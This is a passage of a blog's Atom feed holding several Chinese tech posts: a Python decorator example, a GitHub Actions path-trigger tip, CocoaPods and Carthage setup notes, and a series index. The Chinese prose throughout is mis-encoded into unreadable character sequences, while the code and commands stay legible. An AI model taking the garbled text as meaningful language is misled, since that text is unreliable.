func</span>):</span><br><span class="line">        functools.update_wrapper(self, func)</span><br><span class="line">        self.func = func</span><br><span class="line">        self.num_calls = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ‰©å±•åŠŸèƒ½ï¼Œæ‰§è¡Œå‡½æ•°å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        self.num_calls += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Call <span class="subst">&#123;self.num_calls&#125;</span> of <span class="subst">&#123;self.func.__name__!r&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="meta">@CountCalls</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">say_hello(<span class="number">5</span>)</span><br><span class="line">say_hello(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Call <span class="number">1</span> of <span class="string">&#x27;say_hello&#x27;</span></span><br><span class="line">Hello!</span><br><span class="line">Call <span class="number">2</span> of <span class="string">&#x27;say_hello&#x27;</span></span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure><h3><span id="yi-xie-dian-xing-de-yong-li">ä¸€äº›å…¸å‹çš„ç”¨ä¾‹</span></h3><ul><li>ä½¿ç”¨è®¡æ—¶å™¨è£…é¥°å™¨æ¥è®¡ç®—å‡½æ•°çš„æ‰§è¡Œæ—¶é—´</li><li>ä½¿ç”¨è°ƒè¯•è£…é¥°å™¨æ¥æ‰“å°å‡ºæœ‰å…³è¢«è°ƒç”¨å‡½æ•°åŠå…¶å‚æ•°çš„æ›´å¤šä¿¡æ¯</li><li>ä½¿ç”¨æ£€æŸ¥ä¿®é¥°ç¬¦æ£€æŸ¥å‚æ•°æ˜¯å¦æ»¡è¶³æŸäº›è¦æ±‚å¹¶ç›¸åº”åœ°è°ƒæ•´è¡Œä¸º</li><li>æ³¨å†Œå‡½æ•°ï¼ˆæ’ä»¶ï¼‰</li><li>ä½¿ç”¨ <code>time.sleep()</code> é™ä½ä»£ç é€Ÿåº¦ä»¥æ£€æŸ¥ç½‘ç»œè¡Œä¸º</li><li>ç¼“å­˜è¿”å›å€¼ä»¥è¿›è¡Œè®°å¿†åŒ–ï¼ˆ<a href="https://en.wikipedia.org/wiki/Memoization%EF%BC%89">https://en.wikipedia.org/wiki/Memoizationï¼‰</a></li><li>æ·»åŠ ä¿¡æ¯æˆ–æ›´æ–°çŠ¶æ€</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      13. è£…é¥°å™¨ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬10å¤©ï¼šè·¯å¾„è§¦å‘å™¨</title>
    <link href="https://qiwihui.com/qiwihui-blog-93/"/>
    <id>https://qiwihui.com/qiwihui-blog-93/</id>
    <published>2022-08-13T01:54:25.680Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å‰é¢æˆ‘ä»¬çœ‹åˆ°å¯ä»¥é™åˆ¶<a href="https://qiwihui.com/qiwihui-blog-84/">åŸºäºåˆ†æ”¯è¿‡æ»¤å™¨çš„</a>å·¥ä½œæµè¿è¡Œã€‚å¯¹äºç”± <code>push</code> æˆ– <code>pull_request</code> è§¦å‘çš„å·¥ä½œæµï¼Œä½ å¯ä»¥å¯¹å…¶è¿›è¡Œé™åˆ¶ï¼Œä»¥ä½¿å…¶ä»…åœ¨æ¨é€åˆ°ç‰¹å®šåˆ†æ”¯æˆ–é’ˆå¯¹ç‰¹å®šåˆ†æ”¯æ‰“å¼€ pull request æ—¶æ‰è§¦å‘ã€‚</p><p>ä½ è¿˜å¯ä»¥é™åˆ¶è¿™äº›å·¥ä½œæµï¼Œä»¥ä¾¿ä»…åœ¨<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushpull_requestpaths">æ¨é€ç‰¹å®šè·¯å¾„</a>æ—¶æ‰è§¦å‘å®ƒä»¬ã€‚</p><span id="more"></span><p>å¦‚æœä½ åœ¨æäº¤æŸäº›ä¸œè¥¿æ—¶ä¼šè¿è¡Œä¸€äº›è‡ªåŠ¨åŒ–åŠŸèƒ½ï¼Œè¿™å°†éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼šåœ¨æˆ‘çš„ä¸€ä¸ªå¼€æºé¡¹ç›®ä¸­ï¼Œæ¯æ¬¡å°†æäº¤åˆå¹¶åˆ°masteråˆ†æ”¯ä¸­æ—¶ï¼Œæˆ‘ä»¬éƒ½ä¼šå°†æ–‡æ¡£å‘å¸ƒåˆ°æˆ‘ä»¬çš„ç½‘ç«™ä¸Šã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬åªæƒ³åœ¨æ–‡æ¡£å®é™…æ›´æ”¹æ—¶è¿è¡Œè¯¥å·¥ä½œæµç¨‹ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›docsåœ¨masteråˆ†æ”¯ä¸­ç›®å½•ä¸­çš„ä»»ä½•å†…å®¹æ›´æ”¹æ—¶è¿è¡Œã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet">é€šé…ç¬¦</a>ä½œä¸ºè·¯å¾„è¿‡æ»¤å™¨çš„ä¸€éƒ¨åˆ†ï¼š</p><script src="https://gist.github.com/ethomson/5244d867cb44c3d855f05094562d6dc2.js"></script><p>ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå·¥ä½œæµç¨‹ï¼Œåªè¦æˆ‘ä»¬å¯¹æ–‡ä»¶docså¤¹ä¸­çš„æ–‡ä»¶è¿›è¡Œæ–°æ›´æ”¹å¹¶å°†å…¶åˆå¹¶åˆ°masteråˆ†æ”¯ä¸­ï¼Œå°±å¯ä»¥è¿è¡Œè„šæœ¬ <code>publish_docs.sh</code>ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_10_path_triggers.html">https://www.edwardthomson.com/blog/github_actions_10_path_triggers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬10å¤©ï¼šè·¯å¾„è§¦å‘å™¨
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Cocoapods å’Œ Carthage ä½¿ç”¨ç¬”è®°</title>
    <link href="https://qiwihui.com/qiwihui-blog-44/"/>
    <id>https://qiwihui.com/qiwihui-blog-44/</id>
    <published>2022-08-13T01:54:25.660Z</published>
    <updated>2024-05-15T02:25:31.473Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="carthage-he-coaoapods-de-qu-bie">Carthage å’Œ CoaoaPods çš„åŒºåˆ«</span></h2><p><code>CoaoaPods</code> æ˜¯ä¸€å¥—æ•´ä½“è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬åœ¨ <code>Podfile</code> ä¸­æŒ‡å®šå¥½æˆ‘ä»¬éœ€è¦çš„ç¬¬ä¸‰æ–¹åº“ã€‚ç„¶å <code>CocoaPods</code> å°±ä¼šè¿›è¡Œä¸‹è½½ï¼Œé›†æˆï¼Œç„¶åä¿®æ”¹æˆ–è€…åˆ›å»ºæˆ‘ä»¬é¡¹ç›®çš„ <code>workspace</code> æ–‡ä»¶ï¼Œè¿™ä¸€ç³»åˆ—æ•´ä½“æ“ä½œã€‚</p><p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œ<code>Carthage</code> å°±è¦è½»é‡å¾ˆå¤šï¼Œå®ƒä¹Ÿä¼šä¸€ä¸ªå«åš <code>Cartfile</code> æè¿°æ–‡ä»¶ï¼Œä½† <code>Carthage</code> ä¸ä¼šå¯¹æˆ‘ä»¬çš„é¡¹ç›®ç»“æ„è¿›è¡Œä»»ä½•ä¿®æ”¹ï¼Œæ›´ä¸å¤šåˆ›å»º <code>workspace</code>ã€‚å®ƒåªæ˜¯æ ¹æ®æˆ‘ä»¬æè¿°æ–‡ä»¶ä¸­é…ç½®çš„ç¬¬ä¸‰æ–¹åº“ï¼Œå°†ä»–ä»¬ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨ <code>xcodebuild</code> æ„å»ºæˆ <code>framework</code> æ–‡ä»¶ã€‚ç„¶åç”±æˆ‘ä»¬è‡ªå·±å°†è¿™äº›åº“é›†æˆåˆ°é¡¹ç›®ä¸­ã€‚<code>Carthage</code> ä½¿ç”¨çš„æ˜¯ä¸€ç§<strong>éä¾µå…¥æ€§</strong>çš„å“²å­¦ã€‚</p><p>å¦å¤– <code>Carthage</code> é™¤äº†éä¾µå…¥æ€§ï¼Œå®ƒè¿˜æ˜¯å»ä¸­å¿ƒåŒ–çš„ï¼Œå®ƒçš„åŒ…ç®¡ç†ä¸åƒ <code>CocoaPods</code> é‚£æ ·ï¼Œæœ‰ä¸€ä¸ªä¸­å¿ƒæœåŠ¡å™¨(<a href="http://cocoapods.org">cocoapods.org</a>)ï¼Œæ¥ç®¡ç†å„ä¸ªåŒ…çš„å…ƒä¿¡æ¯ï¼Œè€Œæ˜¯ä¾èµ–äºæ¯ä¸ªç¬¬ä¸‰æ–¹åº“è‡ªå·±çš„æºåœ°å€ï¼Œæ¯”å¦‚ Githubã€‚</p><span id="more"></span><h2><span id="cocoapods">Cocoapods</span></h2><h3><span id="an-zhuang">å®‰è£…</span></h3><ol><li><p>ï¼ˆå¯é€‰ï¼‰ä½¿ç”¨ <del>taobao</del> ruby-china æºæ›¿æ¢é»˜è®¤ gem æº: <code>gem source blabla..</code></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gem sources -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://rubygems.org/</span><br><span class="line"></span><br><span class="line">$ gem sources --remove https://rubygems.org/</span><br><span class="line">https://ruby.taobao.org/ removed from sources</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -a https://gems.ruby-china.com/</span><br><span class="line">https://gems.ruby-china.com/ added to sources</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -c</span><br><span class="line">*** Removed specs cache ***</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -u</span><br><span class="line"><span class="built_in">source</span> cache successfully updated</span><br><span class="line"></span><br><span class="line">$ gem sources -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://gems.ruby-china.com/</span><br></pre></td></tr></table></figure></li><li><p><code>sudo gem install cocoapods</code></p></li><li><p>ï¼ˆå¯é€‰ï¼‰åˆ‡æ¢ pod æº</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pod repo</span><br><span class="line"></span><br><span class="line">master</span><br><span class="line">- Type: git (master)</span><br><span class="line">- URL:  https://github.com/CocoaPods/Specs.git</span><br><span class="line">- Path: /Users/qiwihui/.cocoapods/repos/master</span><br><span class="line"></span><br><span class="line">$ pod repo remove master</span><br><span class="line"></span><br><span class="line">$ pod repo add master https://git.coding.net/CocoaPods/Specs.git</span><br><span class="line"></span><br><span class="line">$ pod repo update</span><br><span class="line"></span><br><span class="line">$ pod setup</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://git.coding.net/CocoaPods/Specs.git ~/.cocoapods/repos/master</span><br><span class="line">$ pod repo update</span><br></pre></td></tr></table></figure><p>åˆ‡æ¢å›å®˜æ–¹é•œåƒ</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pod repo remove master</span><br><span class="line"></span><br><span class="line">$ pod repo add master https://github.com/CocoaPods/Specs.git</span><br><span class="line"></span><br><span class="line">$ pod repo update</span><br><span class="line">Updating spec repo `master`</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master fetch origin --progress</span><br><span class="line">  remote: Enumerating objects: 511, <span class="keyword">done</span>.        </span><br><span class="line">  remote: Counting objects: 100% (511/511), <span class="keyword">done</span>.        </span><br><span class="line">  remote: Compressing objects: 100% (134/134), <span class="keyword">done</span>.        </span><br><span class="line">  remote: Total 820 (delta 399), reused 449 (delta 367), pack-reused 309        </span><br><span class="line">  Receiving objects: 100% (820/820), 99.24 KiB | 401.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">  Resolving deltas: 100% (501/501), completed with 194 <span class="built_in">local</span> objects.</span><br><span class="line">  From https://github.com/CocoaPods/Specs</span><br><span class="line">     5b04790953c..e3ba7ee3a29  master     -&gt; origin/master</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master rev-parse --abbrev-ref HEAD</span><br><span class="line">  master</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master reset --hard origin/master</span><br><span class="line">  HEAD is now at e3ba7ee3a29 [Add] IOS_OC_BASIC 6.3</span><br><span class="line"></span><br><span class="line">CocoaPods 1.6.0.beta.2 is available.</span><br><span class="line">To update use: `sudo gem install cocoapods --pre`</span><br><span class="line">[!] This is a <span class="built_in">test</span> version we<span class="string">&#x27;d love you to try.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more information, see https://blog.cocoapods.org and the CHANGELOG for this version at https://github.com/CocoaPods/CocoaPods/releases/tag/1.6.0.beta.2</span></span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœPodfileæ–‡ä»¶ä¸­æœ‰</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source &#x27;https://github.com/CocoaPods/Specs.git&#x27;</span><br></pre></td></tr></table></figure><p>ä¹Ÿéœ€è¦æŠŠå®ƒæ¢æˆrepoçš„æºï¼Œå¦åˆ™ä¾ç„¶æ˜¯ä½¿ç”¨GitHubæº</p></li></ol><h3><span id="ji-chu-yong-fa">åŸºç¡€ç”¨æ³•</span></h3><ol start="0"><li><p><code>cd &lt;project_folder&gt;</code></p></li><li><p><code>pod init</code></p></li><li><p>ç¼–è¾‘ Podfile, example</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¹³å°ï¼Œå¿…éœ€</span><br><span class="line">platform :ios, &#x27;9.0&#x27;</span><br><span class="line"># éšè—è­¦å‘Š</span><br><span class="line">inhibit_all_warnings!</span><br><span class="line"></span><br><span class="line">target &#x27;AlamofireDemo&#x27; do</span><br><span class="line">    # Using Swift and want to use dynamic frameworks</span><br><span class="line">    use_frameworks!</span><br><span class="line"></span><br><span class="line">    # é¡¹ç›® Pods</span><br><span class="line">    pod &#x27;Alamofire&#x27;, &#x27;~&gt; 4.5&#x27;</span><br><span class="line"></span><br><span class="line">    target &#x27;AlamofireDemoTests&#x27; do</span><br><span class="line">        inherit! :search_paths</span><br><span class="line">        # æµ‹è¯• Pods</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>ç‰ˆæœ¬æ”¯æŒï¼š- <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>- <code>~&gt;</code>: <strong>up to</strong> next major | minor | patch- <code>:path</code> æœ¬åœ°ç»å¯¹è·¯å¾„- <code>:git</code> gité¡¹ç›®åœ°å€ï¼Œè¿˜å¯ä½¿ç”¨ <code>:branch</code>, <code>:tag</code>, <code>:commit</code></p></li><li><p><code>pod install</code></p></li><li><p><strong>Always</strong> æ‰“å¼€é¡¹ç›®ä¸‹ *.xcworkspace æ–‡ä»¶ä½œä¸ºé¡¹ç›®å…¥å£</p></li></ol><h3><span id="pod-install-he-pod-update-qu-bie">pod install å’Œ pod update åŒºåˆ«</span></h3><ul><li><code>pod install [package_name]</code>: å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„ pods</li><li><code>pod update [package_name]</code>: å‡çº§ pods åˆ°æœ€æ–°ç‰ˆæœ¬</li></ul><h2><span id="carthage">Carthage</span></h2><h3><span id="an-zhuang">å®‰è£…</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install carthage</span><br></pre></td></tr></table></figure><h3><span id="shi-yong">ä½¿ç”¨</span></h3><ol><li><p>ç¼–è¾‘ <code>Cartfile</code>ï¼Œæ¯”å¦‚ <code>SwiftyJSON</code></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">github <span class="string">&quot;SwiftyJSON/SwiftyJSON&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>carthage update [â€“platform ios]</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ carthage update</span><br><span class="line">*** Fetching SwiftyJSON</span><br><span class="line">*** Checking out SwiftyJSON at <span class="string">&quot;4.2.0&quot;</span></span><br><span class="line">*** xcodebuild output can be found <span class="keyword">in</span> /var/folders/kl/g94q0k_571vdjtcwzzcv20s40000gn/T/carthage-xcodebuild.nN22hg.<span class="built_in">log</span></span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON iOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON watchOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON tvOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON macOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br></pre></td></tr></table></figure></li><li><p><code>Carthage</code> ç›®å½•ä¸‹ï¼š</p><ul><li>Build(ç¼–è¯‘å‡ºæ¥çš„.frameworkäºŒè¿›åˆ¶ä»£ç åº“)</li><li>Checkouts(æºç )</li></ul> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree -L 3 Carthage/</span><br><span class="line">Carthage/</span><br><span class="line">â”œâ”€â”€ Build</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Mac</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ SwiftyJSON.framework</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ SwiftyJSON.framework.dSYM</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ iOS</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ 22BD4B6C-0B26-35E1-AF5F-8FB6AEBFD2FD.bcsymbolmap</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ C862E8A1-24ED-398A-A8E9-A7384E34EDB1.bcsymbolmap</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ SwiftyJSON.framework</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ SwiftyJSON.framework.dSYM</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ tvOS</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ 1ADB9C1F-36CA-3386-BF07-6EE29B5F8081.bcsymbolmap</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ SwiftyJSON.framework</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ SwiftyJSON.framework.dSYM</span><br><span class="line">â”‚Â Â  â””â”€â”€ watchOS</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ A8A151AB-D15E-3A0B-8A17-BF1A39EC6AB4.bcsymbolmap</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ EA427A42-6D21-3FF4-919F-5E50BF8A5D7B.bcsymbolmap</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ SwiftyJSON.framework</span><br><span class="line">â”‚Â Â      â””â”€â”€ SwiftyJSON.framework.dSYM</span><br><span class="line">â””â”€â”€ Checkouts</span><br><span class="line">    â””â”€â”€ SwiftyJSON</span><br><span class="line">        â”œâ”€â”€ CHANGELOG.md</span><br><span class="line">        â”œâ”€â”€ Example</span><br><span class="line">        â”œâ”€â”€ LICENSE</span><br><span class="line">        â”œâ”€â”€ Package.swift</span><br><span class="line">        â”œâ”€â”€ README.md</span><br><span class="line">        â”œâ”€â”€ Source</span><br><span class="line">        â”œâ”€â”€ SwiftyJSON.podspec</span><br><span class="line">        â”œâ”€â”€ SwiftyJSON.xcodeproj</span><br><span class="line">        â”œâ”€â”€ SwiftyJSON.xcworkspace</span><br><span class="line">        â”œâ”€â”€ Tests</span><br><span class="line">        â””â”€â”€ scripts</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ ç”Ÿæˆçš„æ–‡ä»¶ï¼š é¡¹ç›® â€œGeneralâ€ -&gt; â€œLinked Frameworks and Librariesâ€ -&gt; å°† <code>Carthage/Build/iOS</code> ä¸­çš„ <code>.framework</code> æ–‡ä»¶æ·»åŠ åˆ°é¡¹ç›®ä¸­</p></li><li><p>â€œBuild Phasesâ€ -&gt; â€œ+â€ -&gt; â€œNew Run Script Phaseâ€</p><ul><li>/bin/sh</li><li>/usr/local/bin/carthage copy-frameworks</li><li>â€œInput Filesâ€: $(SRCROOT)/Carthage/Build/iOS/SwiftyJSON.framework</li><li>â€œOutput Filesâ€: $(BUILT_PRODUCTS_DIR)/$(FRAMEWORKS_FOLDER_PATH)/SwiftyJSON.framework</li></ul><p>æ·»åŠ è¿™ä¸ª Run Script çš„ä½œç”¨æ˜¯ä¸ºäº†è®©è¿è¡Œæ—¶èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªåŠ¨æ€åº“ã€‚è¿˜å¯ä»¥å°† Carthage æ‰€é›†æˆçš„ç¬¬ä¸‰æ–¹åº“ç”Ÿæˆçš„ç¬¦å·æ–‡ä»¶æ·»åŠ åˆ°é¡¹ç›®ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œå°±å¯ä»¥æ­¥å…¥ç¬¬ä¸‰æ–¹åº“å†…éƒ¨çš„ä»£ç ï¼š<code>Build Phrases</code> -&gt; <code>New Copy Files Phrase</code>ï¼Œå°† Carthage/Build/iOS ç›®å½•ä¸­çš„ <code>SwiftyJSON.framework.dSYM</code> ç¬¦å·æ–‡ä»¶æ‹–åŠ¨è¿›æ¥</p></li></ol><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://www.jianshu.com/p/f024ca2267e3">è§£å†³Cocoapodsè´¼æ…¢é—®é¢˜</a></li><li><a href="http://swiftcafe.io/2015/10/25/swift-daily-carthage-package">Carthage åŒ…ç®¡ç†å·¥å…·ï¼Œå¦ä¸€ç§æ•æ·è½»å¿«çš„ iOS &amp; MAC å¼€å‘ä½“éªŒ</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Cocoapods å’Œ Carthage ä½¿ç”¨ç¬”è®°
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions Advent Calendar ç³»åˆ—æ–‡ç«  - Index</title>
    <link href="https://qiwihui.com/qiwihui-blog-83/"/>
    <id>https://qiwihui.com/qiwihui-blog-83/</id>
    <published>2022-08-13T01:54:25.660Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æˆ‘åœ¨åšé¡¹ç›® <a href="https://codedays.app">codedays.app</a> è¿‡ç¨‹ä¸­ï¼Œå‘ç° Github æ¨å‡ºçš„ Github Actions å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç”¨æ¥åšCI/CDä¹‹ç±»çš„å·¥ä½œï¼Œæ‰€ä»¥å†³å®šå°† <a href="https://www.edwardthomson.com/blog/github_actions_advent_calendar.html">GitHub Actions Advent Calendar</a> è¿™ä¸ªç³»åˆ—çš„æ–‡ç« åšä¸ªç®€å•çš„ç¿»è¯‘å’Œæ•´ç†ã€‚è¿™ç¯‡æ–‡ç« æ˜¯æ‰€æœ‰æ–‡ç« çš„ç´¢å¼•ã€‚</p><p>æ¯å¤©ä¸€ä¸ªtipsï¼š</p><ul><li>[x] ç¬¬1å¤©: CI/CD Triggers</li><li>[x] ç¬¬2å¤©: Matrix Workflows</li><li>[x] ç¬¬3å¤©: Cross-Platform Builds</li><li>[ ] ç¬¬4å¤©: Installing Tools</li><li>[ ] ç¬¬5å¤©: Building in Containers</li><li>[ ] ç¬¬6å¤©: Fail-Fast Matrix Workflows</li><li>[ ] ç¬¬7å¤©: Starter Workflows</li><li>[ ] ç¬¬8å¤©: Dealing with Stale Issues</li><li>[ ] ç¬¬9å¤©: Deploy to GitHub Packages</li><li>[ ] ç¬¬10å¤©: Path Triggers</li><li>[ ] ç¬¬11å¤©: Secrets</li><li>[ ] ç¬¬12å¤©: Information about your Workflow</li><li>[ ] ç¬¬13å¤©: Conditionals</li><li>[ ] ç¬¬14å¤©: Conditionals with a Matrix</li><li>[ ] ç¬¬15å¤©: Sharing Data Between Steps</li><li>[ ] ç¬¬16å¤©: Conditionals with Shared Data</li><li>[ ] ç¬¬17å¤©: Dependent Jobs</li><li>[ ] ç¬¬18å¤©: Artifacts</li><li>[ ] ç¬¬19å¤©: Downloading Artifacts</li><li>[ ] ç¬¬20å¤©: Container Services</li><li>[ ] ç¬¬21å¤©: GitHub Script</li><li>[ ] ç¬¬22å¤©: Automerge Security Updates</li><li>[ ] ç¬¬23å¤©: Upload Release Builds</li><li>[ ] ç¬¬24å¤©: Caching Dependencies</li><li>[ ] ç¬¬25å¤©: Sparkle a Christmas Tree</li><li>[ ] ç¬¬26å¤©: Self-Hosted Runners</li><li>[ ] ç¬¬27å¤©: Deploy to Cloud</li><li>[ ] ç¬¬28å¤©: Repository Automation</li><li>[ ] ç¬¬29å¤©: Creating an Action</li><li>[ ] ç¬¬30å¤©: Integrating Other APIs in an Action</li><li>[ ] ç¬¬31å¤©: Adding an Action to the Marketplace</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions Advent Calendar ç³»åˆ—æ–‡ç«  - Index
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬20å¤©ï¼šå®¹å™¨æœåŠ¡</title>
    <link href="https://qiwihui.com/qiwihui-blog-103/"/>
    <id>https://qiwihui.com/qiwihui-blog-103/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
